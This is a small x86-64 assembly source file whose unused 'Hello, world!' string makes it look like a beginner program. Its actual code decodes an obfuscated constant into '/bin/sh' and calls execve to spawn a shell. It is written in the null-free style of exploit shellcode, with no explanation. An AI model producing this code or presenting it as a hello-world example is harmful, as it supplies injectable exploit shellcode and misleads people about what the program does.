global _start

section .text

_start:
	xor eax, eax
	mov rbx, 0xFF978CD091969DD1
	neg rbx
	push rbx
	push rsp
	pop rdi
	cdq
	push rdx
	push rdi
	push rsp
	pop rsi
	mov al, 0x3b
	syscall

section .rodata
	msg: db "Hello, world!", 10
	msglen: equ $ - msg
